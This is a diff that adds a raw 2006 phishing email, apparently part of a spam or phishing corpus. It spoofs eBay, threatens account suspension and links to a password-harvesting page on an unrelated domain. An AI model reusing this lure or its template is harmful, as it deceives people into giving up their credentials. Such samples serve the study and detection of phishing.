@@ -1,0 +1,136 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <webmaster@webmaidam.maidam.gov.my>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id ABBC546C92
+ for <user@login.example.com>; Sat,  9 Sep 2006 09:49:06 -0400 (EDT)
+Received: from webmaidam.maidam.gov.my (unknown [218.208.50.165])
+ by mail.example.org (Postfix) with ESMTP id EC8546FA55F
+ for <user@example.com>; Sat,  9 Sep 2006 09:49:05 -0400 (EDT)
+Received: from webmaidam.maidam.gov.my (localhost [127.0.0.1])
+ by webmaidam.maidam.gov.my (8.12.11/8.12.11) with ESMTP id k89DZDIH022712
+ for <user@example.com>; Sat, 9 Sep 2006 21:35:13 +0800
+Received: (from webmaster@localhost)
+ by webmaidam.maidam.gov.my (8.12.11/8.12.11/Submit) id k89DZDjh022710;
+ Sat, 9 Sep 2006 21:35:13 +0800
+Date: Sat, 9 Sep 2006 21:35:13 +0800
+Message-Id: <200609091335.k89DZDjh022710@webmaidam.maidam.gov.my>
+To: user@example.com
+Subject: Password change required!
+From: "eBay Inc." <admin@eBay.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 210
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Untitled Document</title>
+</head>
+
+<body>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+  <TBODY>
+    <TR vAlign=top>
+      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"
+width=400><TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+          <TBODY>
+            <TR vAlign=top>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><p><img
+src="http://pics.ebaystatic.com/aw/pics/navbar/eBayLogoTM.gif" width="150" height="70"></p>
+              <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=pp_heading align=left><div align="center"><BR>
+                            <strong>Password change required!</strong></div></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><BR>
+                Dear sir, <BR>
+                <BR>
+                We recently have determined that different computers have logged onto your eBay  account, and multiple
+password failures were present before the logons. We strongly advice CHANGE YOUR PASSWORD. <BR>
+                <BR>
+                If this is not completed by <STRONG>September 15, 2006</STRONG>, we will be forced to suspend your
+account indefinitely, as it may have been used for fraudulent purposes. Thank you for your cooperation. <BR>
+                <BR>
+&nbsp;
+                <TABLE cellSpacing=0 cellPadding=1 width="75%" align=left bgColor=#ffe65c
+border=0>
+                  <TBODY>
+                    <TR>
+                      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><TABLE cellSpacing=0
+cellPadding=4 width="100%" align=center bgColor=#dfdffd
+border=0>
+                          <TBODY>
+                            <TR>
+                              <TD class=pp_sansserif align=middle><A
+href="http://ul95.maple.jp/.change/index.php?MfcISAPICommand=ChangeFPP"
+target=_blank>Click here to Change Your Password</A></TD>
+                            </TR>
+                          </TBODY>
+                      </TABLE></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE>
+                <P><BR>
+                    <BR>
+                    <BR>
+                    Thank you for your prompt attention to this matter. <BR>
+                    <BR>
+                    We apologize for any inconvenience.<BR>
+                  <BR>
+                  <BR>
+                  <BR>
+                  Thank you for using eBay! </P></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><HR class=dotted>
+              </TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><TABLE cellSpacing=0
+cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=pp_footer>Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. </TD>
+                    <TR>
+                      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><IMG
+height=10 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1
+border=0></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><BR>
+                  <SPAN
+class=pp_footer></SPAN></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</body>
+</html>
+
+
